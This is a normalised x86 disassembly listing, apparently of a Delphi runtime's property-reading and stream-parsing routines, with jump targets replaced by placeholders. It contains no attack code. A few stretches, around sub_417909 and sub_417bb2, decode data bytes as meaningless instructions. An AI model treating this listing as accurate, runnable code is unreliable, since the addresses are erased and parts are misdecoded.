not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_416fa0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_416fc0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40274c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_416fa0
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_4189f0
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403290
sub_417020
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417106
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418b90
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_4170da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41710b
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416fc0
pop ecx
test al al
jne r-xdata
call sub_403a98
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a44
sub_417130
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4171a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_40348c
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_4135c0
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_4171ad
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416fc0
pop ecx
test al al
jne r-xdata
call sub_403a98
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a44
sub_4171d0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41724b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418b90
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_40348c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417250
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416fc0
pop ecx
test al al
jne r-xdata
call sub_403a98
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a44
sub_417274
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_417495
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418520
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418520
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_417465
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_417423
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_416ec0
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416f38
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_417020
pop ecx
push ebp
call sub_4171d0
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_417130
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403ac8
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416f38
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_416f38
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41749c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_404004
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404fa0
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_40348c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413ad0
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416e84
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413918
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416e84
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413918
sub_417428
push ebp
call sub_416fa0
pop ecx
test al al
je r-xdata
call sub_403a44
call sub_403a98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403290
sub_4174b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417520
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41750b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417520
mov eax [ ebp - 0x4 ]
call sub_416a70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416bb4
retn
sub_417520
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416958
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417a28
mov eax [ ebp - 0x4 ]
call sub_4178c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_40348c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_4175e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_40348c
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416958
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_417274
mov eax [ ebp - 0x4 ]
call sub_4178c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4175e9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_4175f0
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4186fc
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417878
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_416cc0
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_417634
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4186fc
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417878
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416cc0
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_417678
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4186fc
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417878
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416cc0
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_4176c8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4186fc
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417878
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416cc0
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41770c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4186fc
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_416798
mov al [ eax + lookup_table_417733 ]
jmp [ eax * 4 + jump_table_417741 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416cc0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040d0
mov eax esi
call j_sub_4044ac
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416cc0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404034
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404034
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404034
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404034
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41780c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4186fc
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416cc0
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_416cc0
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416cc0
jmp r-xdata
jmp r-xdata
call sub_416798
sub_417878
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_416c9c
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41780c
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_4186fc
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416cc0
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_4178cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_416c9c
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4186fc
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41780c
mov [ edi ] eax
sub_417909
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4179fd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403fe0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404078
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a04
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404244
sub_417a28
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_417bf8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_40385c
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418520
xor edx edx
push ebp
push j_sub_40385c#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4042a0
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404500
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034d0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410894
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034d0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410894
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417dac
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416cac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416cac
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410904
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_417a0c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417bff
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov edi ebx
jmp r-xdata
sub_417bb2
add [ eax ] eax
add [ eax ] al
push 0xbe00406f
jpo r-xdata
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a44
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417bff
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
sub_417c08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_413468
mov ebx eax
test ebx ebx
je r-xdata
call sub_416798
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_410978
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417c50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41622c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413918
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417c90
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_417cdf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418e14
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_410e14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ce6
lea eax [ ebp - 0x10 ]
call sub_40e9b8
retn
sub_417cec
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_417d9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_416c9c
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41770c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41622c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413918
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4186fc
lea eax [ ebp - 0x4 ]
call sub_40564c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_410ec8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417da5
lea eax [ ebp - 0x8 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_40564c
retn
sub_417dac
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4180a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4180ae
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404004
lea eax [ ebp - 0x24 ]
call sub_4046c0
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404004
retn
jmp [ eax * 4 + jump_table_417e3c ]
mov eax [ rw-data ]
call sub_416780
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410904
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416c9c
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416d5c
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410978
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41770c
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410830
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410978
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175f0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410c08
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41855c
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b08
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418618
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b34
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418440
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410978
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416c9c
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416c9c
cmp al 0xd
jne r-xdata
push ebp
call sub_417c90
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417878
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410e8c
jmp r-xdata
push ebp
call sub_417cec
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410904
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41780c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410978
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41770c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417c08
jmp r-xdata
